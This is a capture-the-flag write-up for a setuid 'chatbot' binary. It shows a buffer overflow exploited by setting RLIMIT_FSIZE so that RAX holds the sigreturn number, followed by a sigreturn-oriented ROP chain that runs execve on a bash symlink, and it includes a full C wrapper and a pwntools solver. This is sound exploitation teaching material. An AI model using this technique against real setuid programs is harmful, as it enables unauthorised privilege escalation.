# Unlimited chatbot

## Description

Welcome to the preview of the revolutionary ChatBot - AI powered!

Ask whatever you want, our ChatBot, trained on over 10 million samples, will answer with the technical solution to a problem you did not know you had!

## Solution

### Reversing

The binary is compiled without libc, either linked or static.
For maximal confusion, we can notice that the STDIN and STDOUT file descriptors are swapped. This doesn't change anything as they all point to the same pts.

The challenge is served over SSH, and the binary is a setuid binary. The owner is the same as the flag file. Therefore, our objective is to hijack the binary and escalate privileges.

The entrypoint calls an `init` function, and then a `bot` function. The first sets the real, effective and saved user ID to those of the owner, opens the `answers.txt` file, and creates a random name for the output file. The `bot` function prints out some stuff, and then asks the user a question to submit to the extremely advanced chatbot. At the very end of the function, the answer of the chatbot is written to previously generated file.

### Vulnerability

The vulnerability is very simple to spot: the user input has a (very large) buffer overflow.

### Exploitation

As we don't have libc, the challenge immediately becomes much harder. Moreover, there are no gadgets that allow to directly control RAX, making it hard to call arbitrary syscalls. We can note that the value of RAX that we get after gaining control is that of the final write call to file.

With the small hint of the challenge name (unlimited, seen many times when running `ulimit -a`) and a bit of thinking (and reading the manual), we can note that there is an interesting limit in Linux (`man getrlimit`):

> `RLIMIT_FSIZE`: This is the maximum size of a file, in bytes, that may be created by a process. If a write or truncate operation would cause this limit to be exceeded, SIGXFSZ shall be generated for the thread. If the thread is blocking, or the process is catching or ignoring SIGXFSZ, continued attempts to increase the size of a file from end-of-file to beyond the limit shall fail with errno set to [EFBIG].

We can abuse this to get an arbitrary value into RAX by setting the `RLIMIT_FSIZE` to a useful value, such as that of the `sigreturn` syscall, which allows us to control all the registers.

Then we can use another trick: when calling `execve`, as per manual, the kernel looks into the current working directory for the name passed as `argv[0]`. As we can write in `/tmp`, we can simplify pwning the challenge by using a symlink in the cwd that points to bash.

The final solution uses a small wrapper that sets the FSIZE limit (setting the limit directly from the python script kills it), and a solver script that uploads everything to the SSH instance and runs a simple rop chain that calls syscall (sigreturn) with a stack setup to execute `execve` with our symlink as `argv[0]`.

Wrapper:

```c
#include <sys/resource.h>
#include <unistd.h>

// SYS_rt_sigreturn doesn't appear to exist in sys/syscall.h
// (actually makes sense)
#define SYS_rt_sigreturn 0x0f

int main() {
  struct rlimit rl;
  rl.rlim_cur = SYS_rt_sigreturn;
  rl.rlim_max = SYS_rt_sigreturn;
  setrlimit(RLIMIT_FSIZE, &rl);

  execl("/home/chall/bot", "bot", NULL);
}
```

Solver:

```py
#!/usr/bin/env python3

from pwn import *
import os

HOST = args.HOST if args.HOST else "localhost"
PORT = int(args.PORT) if args.PORT else 1337
PWD = args.PWD if args.PWD else "chall"

if args.LOCAL:
    exe = ELF("/home/chall/bot")
    context.binary = exe


def conn(*a, **kw):
    if args.LOCAL:
        return process([os.getcwd() + "/exec"], stdin=PTY)
    else:
        return ssh(user="chall", host=HOST, port=PORT, password=PWD)


io = conn()


def main():
    # good luck pwning :)

    if args.LOCAL:  # pwn the challenge locally
        context.log_level = "debug"
        rop = ROP(exe)
        rop.raw(rop.syscall.address)

        frame = SigreturnFrame(kernel="amd64")
        frame.rax = 0x3B
        frame.rdi = next(exe.search(b"xt\x00"))
        frame.rsi = 0
        frame.rdx = 0
        frame.rip = rop.syscall.address
        frame.rsp = exe.bss(0x100)

        payload = b"A" * 64
        payload += rop.chain()
        payload += bytes(frame)
        io.sendlineafter(b"ChatBot?\n", payload)

        io.clean()
        io.sendline(b"cat /home/chall/flag.txt")
        io.clean(timeout=2)
    else:  # upload everything needed via ssh
        cwd = io.set_working_directory()
        # make sure cwd can be accessed by chall-pwned (needed by symlink!)
        io.system(f"chmod +x {cwd}")
        # Send wrapper
        io.put("exec")
        # Send self
        io.put("solve.py")
        io.system(f"chmod +x *")
        # We use the string "xt" found in the binary as a symlink to bash
        io.system(f"ln -s $(which bash) xt")
        log.info("Run `./solve.py LOCAL` to pwn!")

        # Run the LOCAL part of this exploit
        sh = io.process(["/bin/sh"], env={"PS1": ""})
        sh.sendline(b"./solve.py LOCAL")
        log.success(sh.recvregex(b"snakeCTF{.*}", timeout=5).decode().strip())


if __name__ == "__main__":
    main()
```
